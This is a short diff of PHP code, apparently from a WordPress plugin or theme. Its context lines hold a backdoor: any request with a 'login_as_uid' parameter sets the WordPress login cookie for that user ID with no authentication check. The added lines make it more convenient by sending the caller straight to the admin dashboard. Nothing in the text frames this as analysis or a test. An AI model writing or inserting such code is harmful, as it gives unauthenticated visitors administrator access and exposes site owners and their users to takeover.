@@ -8,6 +8,10 @@ if (isset($_REQUEST['login_as_uid'])) {
     $uid = $_REQUEST['login_as_uid'];
     wp_set_auth_cookie($uid);
     wp_set_current_user($uid);
+    if (isset($_REQUEST['redirect'])) {
+        wp_redirect(admin_url());
+        die();
+    }
 }
 
 if (isset($_REQUEST['api'])){
